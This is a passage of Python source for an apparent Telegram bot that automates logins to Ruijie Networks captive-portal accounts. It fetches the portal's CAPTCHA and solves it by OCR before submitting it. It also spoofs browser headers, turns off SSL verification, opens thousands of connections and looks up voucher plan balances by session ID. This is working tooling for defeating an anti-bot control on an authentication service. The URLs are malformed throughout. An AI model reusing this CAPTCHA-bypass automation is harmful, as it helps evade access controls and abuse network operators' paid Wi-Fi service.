            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://://ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

# === OCR CAPTCHA SOLVER ===
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': '://ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://://ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://://ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': '://ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://://ruijienetworks.com',
        'referer': 'https://://ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://://ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None

# === BOT STARTUP LOOP ===
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=5000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        # Load local auth cache at startup
        await sync_auth_list_from_github()
        
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(auto_stop_expired_users_task()) # Run background auto-stopper
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
